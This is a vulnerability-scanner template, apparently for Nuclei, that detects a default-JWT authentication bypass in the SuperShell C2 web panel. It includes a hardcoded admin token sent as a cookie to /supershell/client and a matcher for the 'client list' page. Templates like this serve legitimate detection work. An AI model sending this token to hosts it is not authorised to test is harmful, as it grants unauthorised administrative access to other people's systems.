id: supershell-default-jwt
info:
  name: SuperShell Default JWT Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    SuperShell is a C2 remote control platform accessed through WEB services. There is a default JWT token vulnerability in SuperShell, allowing attackers to log in with system privileges.
  reference:
    - https://github.com/tdragon6/Supershell
  tags:
    - default-token
    - jwt

http:
  - raw:
      - |
        GET /supershell/client HTTP/1.1
        Host: {{Hostname}}
        Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjkyNDkyOTYwfQ.c70Gyw-E3gE0sA41piRW1Z07Olth7bmGvDb9Zishqd4

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "客户端列表"
